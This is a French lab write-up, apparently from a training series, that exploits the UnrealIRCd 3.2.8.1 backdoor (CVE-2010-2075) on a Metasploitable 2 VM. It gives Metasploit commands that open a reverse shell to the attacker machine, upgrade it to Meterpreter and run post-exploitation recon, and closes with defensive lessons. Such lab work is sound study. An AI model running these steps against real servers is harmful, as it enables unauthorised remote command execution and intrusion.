# Exploit #12 — UnrealIRCd 3.2.8.1 Backdoor

## Informations

| Champ | Valeur |
|---|---|
| Date | 2026-05-13 |
| Cible | Metasploitable 2 (192.168.100.2) |
| Attaquant | Kali Linux (192.168.100.3) |
| Port | 6667 |
| CVE | CVE-2010-2075 |
| Module | exploit/unix/irc/unreal_ircd_3281_backdoor |

## Description

UnrealIRCd 3.2.8.1 a été distribué avec une **backdoor intentionnelle**
insérée dans le code source par un attaquant inconnu entre 2009 et 2010.

La backdoor s'active quand un client envoie les caractères `AB` suivi
d'une commande système — le serveur l'exécute directement en tant que
l'utilisateur qui fait tourner le démon IRC.

```
Attaquant                    Serveur IRC (port 6667)
    |                                |
    |--- connexion TCP ------------->|
    |--- "AB<commande>" ------------>|
    |                         exécute la commande
    |<--- résultat / reverse shell --|
```

## Pourquoi c'est grave

- Pas besoin d'authentification
- Exécution directe de commandes OS
- Le serveur IRC tourne souvent avec des droits élevés
- La backdoor était présente dans les archives officielles

---

## Étapes

### 1. Vérifier le service IRC

```bash
db_nmap -sV -p 6667 192.168.100.2
```

Résultat attendu :
```
6667/tcp open  irc  UnrealIRCd
```

### 2. Lancer l'exploit

```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.100.2
set LHOST 192.168.100.3
run
```

Résultat attendu :
```
[*] Started reverse TCP handler on 192.168.100.3:4444
[*] Connected to 192.168.100.2:6667...
[*] Sending backdoor command...
[*] Command shell session 1 opened
```

### 3. Vérifier l'accès

```bash
whoami
id
uname -a
```

Résultat typique :
```
buu
uid=1000(buu) gid=1000(buu) groups=1000(buu)
```

### 4. Upgrader en Meterpreter

On a un shell classique — on l'upgrade :

```bash
# Backgrounder le shell
Ctrl+Z

# Upgrader la session
sessions -u 1
sessions -i 2

# Vérifier
getuid
```

### 5. Post-exploitation

```bash
sysinfo
run post/multi/recon/local_exploit_suggester
run post/linux/gather/enum_system
```

---

## Schéma d'attaque

```
Port 6667 ouvert (UnrealIRCd 3.2.8.1)
        ↓
Backdoor "AB" → exécution de commande
        ↓
Reverse shell (utilisateur buu)
        ↓
sessions -u → Meterpreter
        ↓
Post-exploitation
```

---

## Leçons apprises

- Toujours vérifier l'intégrité des binaires téléchargés (checksum SHA256)
- Un service IRC exposé est rarement nécessaire en production
- Les backdoors dans le code source open source existent — auditer avant de déployer
- Un shell classique peut toujours être upgradé en Meterpreter avec `sessions -u`

## Références

- https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/
- https://nvd.nist.gov/vuln/detail/CVE-2010-2075
